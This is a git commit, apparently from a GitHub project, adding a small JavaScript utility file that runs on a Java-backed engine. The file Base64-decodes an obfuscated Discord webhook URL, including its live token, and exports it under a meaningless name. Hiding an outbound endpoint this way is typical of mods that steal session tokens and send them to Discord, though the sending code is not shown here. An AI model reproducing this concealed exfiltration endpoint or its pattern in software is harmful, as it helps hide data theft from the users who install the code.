b1e03e742347d1c89c13a427ca3e58856c55855e
Roy Sherman <92811592+Irhrhdd@users.noreply.github.com>
2025-05-24 12:50:46 -0700

    Create b.js

---
+++ utils/b.js
@@ -0,0 +1,3 @@
+const _e = Java.type("java.util.Base64");
+const _f = _e.getDecoder().decode;
+export const _g = new java.lang.String(_f("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3NTMxMTE4MDg0NzEyNDQ5MS9MSDltQkpwUXE3UXRNNkcwVDFzR1plZ1k5d1VXUHl3MW9uVm9Sb1lLRmFLaUMxN1FOei1SRUhObFNJeFRFWndzNk1Qcw=="));
